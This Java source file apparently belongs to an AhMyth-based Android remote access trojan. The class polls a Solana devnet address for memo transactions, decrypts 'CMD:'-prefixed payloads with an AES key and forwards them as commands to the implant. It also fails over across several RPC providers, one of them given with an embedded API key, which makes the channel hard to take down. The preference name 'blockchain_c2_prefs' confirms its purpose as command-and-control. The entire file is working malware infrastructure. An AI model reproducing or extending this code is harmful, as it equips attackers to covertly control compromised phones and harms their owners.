package ahmyth.mine.king.ahmyth;

import android.content.SharedPreferences;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;

/**
 * Solana memo-based command poller.
 * Looks for memo instructions (CMD:<hex>) on the configured channel address.
 */
public class BlockchainEventPoller {
    private static final String TAG = "BlockchainEventPoller";
    private static final String MEMO_PROGRAM = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr";

    private volatile String rpcUrl;
    private final List<String> rpcCandidates = new ArrayList<>();
    private volatile int rpcIndex = 0;
    private final String channelAddress; // base58
    private final byte[] aesKey;
    private final int pollingInterval; // seconds
    private boolean isRunning = false;
    private Thread pollingThread;
    private final HashSet<String> processedSignatures = new HashSet<>();
    private String lastSignature = null;
    private static final String PREFS_NAME = "blockchain_c2_prefs";
    private static final String PREF_LAST_SIG = "last_sig";

    public BlockchainEventPoller(String rpcUrl, String contractAddress, String aesKeyHex, int pollingInterval) {
        this.rpcUrl = rpcUrl;
        this.channelAddress = contractAddress;
        this.pollingInterval = pollingInterval;

        // Build RPC candidate list with primary first and known fallbacks (helps when providers rate-limit/429)
        addRpcCandidate(rpcUrl);
        addRpcCandidate("https://solana-devnet.g.alchemy.com/v2/iYpa8brgKRSbCQ9rb1tx8");
        addRpcCandidate("https://api.devnet.solana.com");
        addRpcCandidate("https://solana-devnet.api.onfinality.io/public");
        addRpcCandidate("https://rpc.ankr.com/solana_devnet");

        byte[] key = null;
        try {
            key = hexStringToByteArray(aesKeyHex);
            if (key.length != 32) throw new IllegalArgumentException("AES key must be 32 bytes");
        } catch (Exception e) {
            Log.e(TAG, "Invalid AES key", e);
        }
        this.aesKey = key;

        try {
            SharedPreferences prefs = MainService.getContextOfApplication().getSharedPreferences(PREFS_NAME, 0);
            String stored = prefs.getString(PREF_LAST_SIG, null);
            if (stored != null && !stored.isEmpty()) {
                lastSignature = stored;
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not load last processed signature", e);
        }
    }

    public void start() {
        if (isRunning) return;
        if (aesKey == null) {
            Log.e(TAG, "Cannot start poller: AES key invalid");
            return;
        }
        isRunning = true;
        pollingThread = new Thread(this::pollLoop);
        pollingThread.setDaemon(true);
        pollingThread.start();
        Log.d(TAG, "Solana memo poller started");
    }

    public void stop() {
        isRunning = false;
        if (pollingThread != null) pollingThread.interrupt();
    }

    private void pollLoop() {
        Log.d(TAG, "Polling loop started - RPC: " + rpcUrl + ", Channel: " + channelAddress);
        while (isRunning) {
            try {
                fetchAndProcessMemos();
            } catch (Exception e) {
                Log.e(TAG, "Error in polling loop", e);
            }
            try {
                Thread.sleep(pollingInterval * 1000L);
            } catch (InterruptedException ie) {
                break;
            }
        }
    }

    private void fetchAndProcessMemos() {
        JSONArray sigs = getRecentSignatures();
        if (sigs == null || sigs.length() == 0) {
            Log.d(TAG, "No signatures found for channel");
            return;
        }
        Log.d(TAG, "Fetched " + sigs.length() + " signatures, processing latest first");
        for (int i = 0; i < sigs.length(); i++) {
            JSONObject obj = sigs.optJSONObject(i);
            if (obj == null) continue;
            String sig = obj.optString("signature", null);
            if (sig == null || sig.isEmpty()) continue;
            if (processedSignatures.contains(sig) || (lastSignature != null && sig.equals(lastSignature))) {
                continue;
            }
            Log.d(TAG, "Processing signature: " + sig);
            processSignature(sig);
            processedSignatures.add(sig);
            if (processedSignatures.size() > 500) {
                processedSignatures.clear();
            }
            lastSignature = sig;
            try {
                SharedPreferences prefs = MainService.getContextOfApplication().getSharedPreferences(PREFS_NAME, 0);
                prefs.edit().putString(PREF_LAST_SIG, lastSignature).apply();
            } catch (Exception ignored) {}
        }
    }

    private JSONArray getRecentSignatures() {
        try {
            JSONObject req = new JSONObject();
            req.put("jsonrpc", "2.0");
            req.put("id", 1);
            req.put("method", "getSignaturesForAddress");
            JSONObject opts = new JSONObject();
            opts.put("limit", 20);
            JSONArray params = new JSONArray();
            params.put(channelAddress);
            params.put(opts);
            req.put("params", params);
            JSONObject resp = sendRpcRequest(req);
            if (resp != null && resp.has("result")) {
                return resp.getJSONArray("result");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to fetch signatures", e);
        }
        return null;
    }

    private void processSignature(String sig) {
        try {
            JSONObject tx = getTransaction(sig);
            if (tx == null) return;
            Log.d(TAG, "Transaction fetched for signature: " + sig);
            JSONObject txObj = tx.optJSONObject("transaction");
            if (txObj == null) return;
            JSONObject message = txObj.optJSONObject("message");
            if (message == null) return;
            JSONArray accountKeys = message.optJSONArray("accountKeys");
            JSONArray instructions = message.optJSONArray("instructions");
            if (accountKeys == null || instructions == null) return;
            Log.d(TAG, "Tx instructions=" + instructions.length() + " accountKeys=" + accountKeys.length());

            boolean memoHandled = false;
            for (int i = 0; i < instructions.length(); i++) {
                JSONObject instr = instructions.getJSONObject(i);

                // Handle parsed memos that come as an object or a raw string
                if (instr.has("parsed")) {
                    Object parsedObj = instr.get("parsed");
                    if (parsedObj instanceof JSONObject) {
                        JSONObject parsed = (JSONObject) parsedObj;
                        String type = parsed.optString("type", "");
                        if ("memo".equalsIgnoreCase(type)) {
                            JSONObject info = parsed.optJSONObject("info");
                            if (info != null) {
                                String memo = info.optString("memo", "");
                                Log.d(TAG, "Parsed memo: " + memo);
                                handleMemo(memo);
                                memoHandled = true;
                                continue;
                            }
                        }
                    } else if (parsedObj instanceof String) {
                        String memo = (String) parsedObj;
                        Log.d(TAG, "Parsed memo string: " + memo);
                        handleMemo(memo);
                        memoHandled = true;
                        continue;
                    }
                }

                // Handle legacy compiled instructions by programId index
                int progIdx = instr.optInt("programIdIndex", -1);
                if (progIdx >= 0 && progIdx < accountKeys.length()) {
                    String programId = accountKeys.optString(progIdx);
                    if (MEMO_PROGRAM.equals(programId)) {
                        String dataB58 = instr.optString("data", "");
                        String memo = decodeBase58ToString(dataB58);
                        Log.d(TAG, "Raw memo (b58 decode): " + memo);
                        handleMemo(memo);
                        memoHandled = true;
                        continue;
                    }
                }

                // Handle instructions that carry programId directly (jsonParsed)
                String programIdStr = instr.optString("programId", null);
                if (!memoHandled && programIdStr != null && MEMO_PROGRAM.equals(programIdStr)) {
                    String dataB58 = instr.optString("data", "");
                    if (dataB58 != null && !dataB58.isEmpty()) {
                        String memo = decodeBase58ToString(dataB58);
                        Log.d(TAG, "Raw memo (b58 decode, direct programId): " + memo);
                        handleMemo(memo);
                        memoHandled = true;
                    }
                }
            }
            if (!memoHandled) {
                Log.d(TAG, "No memo found in transaction " + sig);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to process signature " + sig, e);
        }
    }

    private void handleMemo(String memo) {
        if (memo == null || memo.isEmpty()) return;
        if (!memo.startsWith("CMD:")) return;
        String payloadHex = memo.substring(4);
        try {
            String decrypted = BlockchainCrypto.decrypt(payloadHex, aesKey);
            if (decrypted == null) {
                Log.e(TAG, "Failed to decrypt memo payload");
                return;
            }
            Log.d(TAG, "Decrypted command: " + decrypted);
            JSONObject cmd = new JSONObject(decrypted);
            processCommand(cmd);
        } catch (Exception e) {
            Log.e(TAG, "Error handling memo payload", e);
        }
    }

    private JSONObject getTransaction(String signature) {
        try {
            JSONObject req = new JSONObject();
            req.put("jsonrpc", "2.0");
            req.put("id", 1);
            req.put("method", "getTransaction");
            JSONArray params = new JSONArray();
            params.put(signature);
            JSONObject opts = new JSONObject();
            opts.put("encoding", "jsonParsed");
            opts.put("commitment", "confirmed");
            params.put(opts);
            req.put("params", params);
            JSONObject resp = sendRpcRequest(req);
            if (resp != null && resp.has("result")) {
                return resp.getJSONObject("result");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to fetch transaction " + signature, e);
        }
        return null;
    }

    private void processCommand(JSONObject command) {
        try {
            String action = command.optString("action", "");
            if (action == null || action.isEmpty()) {
                action = command.optString("order", "");
            }
            JSONObject data = command.optJSONObject("data");
            if (data == null) data = command.optJSONObject("payload");
            if (ConnectionManager.context != null) {
                ConnectionManager.processBlockchainCommand(action, data);
            } else {
                Log.w(TAG, "ConnectionManager context not available");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing command", e);
        }
    }

    private JSONObject sendRpcRequest(JSONObject request) {
        int attempts = rpcCandidates.size() > 0 ? rpcCandidates.size() : 1;
        for (int attempt = 0; attempt < attempts; attempt++) {
            try {
                int idx = (rpcIndex + attempt) % rpcCandidates.size();
                String candidate = rpcCandidates.get(idx);
                URL url = new URL(candidate);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                conn.setInstanceFollowRedirects(true);
                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = request.toString().getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }
                int responseCode = conn.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    try (BufferedReader br = new BufferedReader(
                            new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                        StringBuilder response = new StringBuilder();
                        String responseLine;
                        while ((responseLine = br.readLine()) != null) {
                            response.append(responseLine.trim());
                        }
                        rpcIndex = idx;
                        rpcUrl = candidate;
                        if (attempt > 0) {
                            Log.w(TAG, "Switched RPC to " + candidate + " after previous failure");
                        }
                        return new JSONObject(response.toString());
                    }
                } else {
                    StringBuilder errBody = new StringBuilder();
                    try (BufferedReader br = new BufferedReader(
                            new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8))) {
                        String line;
                        while (br != null && (line = br.readLine()) != null) {
                            errBody.append(line.trim());
                        }
                    } catch (Exception ignore) {}
                    Log.e(TAG, "RPC failed code " + responseCode + " body: " + errBody.toString());
                    if (responseCode == 429) continue; // try next RPC on rate limit
                }
            } catch (Exception e) {
                Log.e(TAG, "RPC request error (attempt " + (attempt + 1) + ")", e);
                // rotate on network failures
            }
            try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
        }
        return null;
    }

    private byte[] hexStringToByteArray(String hex) {
        if (hex == null) return new byte[0];
        if (hex.startsWith("0x")) {
            hex = hex.substring(2);
        }
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                    + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }

    private String decodeBase58ToString(String dataB58) {
        try {
            return new String(Base58.decode(dataB58), "UTF-8");
        } catch (Exception e) {
            return "";
        }
    }

    private void addRpcCandidate(String rpc) {
        if (rpc == null || rpc.isEmpty()) return;
        if (!rpcCandidates.contains(rpc)) {
            rpcCandidates.add(rpc);
        }
    }

    // Minimal Base58 decoder (Solana alphabet)
    private static class Base58 {
        private static final String ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        private static final int[] INDEXES = new int[128];
        static {
            for (int i = 0; i < INDEXES.length; i++) INDEXES[i] = -1;
            for (int i = 0; i < ALPHABET.length(); i++) INDEXES[ALPHABET.charAt(i)] = i;
        }
        static byte[] decode(String input) {
            if (input == null || input.length() == 0) return new byte[0];
            byte[] input58 = new byte[input.length()];
            for (int i = 0; i < input.length(); ++i) {
                char c = input.charAt(i);
                int digit = c < 128 ? INDEXES[c] : -1;
                if (digit < 0) throw new IllegalArgumentException("Invalid Base58 character: " + c);
                input58[i] = (byte) digit;
            }
            int zeros = 0;
            while (zeros < input58.length && input58[zeros] == 0) zeros++;
            byte[] decoded = new byte[input.length()];
            int j = decoded.length;
            int startAt = zeros;
            while (startAt < input58.length) {
                int mod = divmod58(input58, startAt);
                if (input58[startAt] == 0) ++startAt;
                decoded[--j] = (byte) mod;
            }
            while (j < decoded.length && decoded[j] == 0) ++j;
            byte[] out = new byte[decoded.length - (j - zeros)];
            System.arraycopy(decoded, j - zeros, out, 0, out.length);
            return out;
        }
        private static int divmod58(byte[] number, int startAt) {
            int remainder = 0;
            for (int i = startAt; i < number.length; i++) {
                int digit256 = (int) number[i] & 0xFF;
                int temp = remainder * 58 + digit256;
                number[i] = (byte) (temp / 256);
                remainder = temp % 256;
            }
            return remainder;
        }
    }
}
